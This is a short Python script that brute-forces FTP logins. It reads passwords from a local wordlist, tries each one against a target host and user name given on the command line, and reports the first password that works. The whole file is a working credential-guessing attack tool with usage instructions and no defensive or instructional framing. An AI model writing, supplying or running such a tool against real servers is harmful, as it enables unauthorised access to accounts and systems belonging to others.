import sys
import os
import ftplib

message = ["How to Use: python [script] [target] [user]","\nExample: python brute_force_ftp.py 127.0.0.1 anonymous"]

class ValidateArgs:
  #
  # Validate Args
  #
  def __init__(self):
    if (len(sys.argv) != 3):
      print(message[0],message[1])
      sys.exit()

class Discover:
    #
    # Read Wordlist
    #
    def __init__(self,file: str):
        with open(file, 'r',encoding='utf-8') as f:
            self.passwords = f.read().splitlines()

class FTPInitializer:
    #
    # FTP Initialization
    #
  def __init__(self, target: str,user: str, password:str):
    self.user = user
    self.password = password
    self.target = target
    self.port = 21
    self.byte = 1024
  
  def initialize_connection_ftp(self):
    ftp = ftplib.FTP(self.target)
    try:
      login_response = ftp.login(self.user,self.password)
    except ftplib.all_errors:
      print(f'Testing Password: {self.password}')
    else:
      print(f'[+] Password Found [+] : {self.password}')
      quit()
    ftp.close()
    
def main():
  directory = os.path.dirname(__file__)
  path = os.path.join(directory, "wordlist", "words.txt")
  discover = Discover(path)

  ValidateArgs()
  _target = sys.argv[1]
  _user = sys.argv[2]

  for password in discover.passwords:
    ftp = FTPInitializer(_target, _user, password)
    ftp.initialize_connection_ftp()

if __name__ == '__main__':  
    main()   
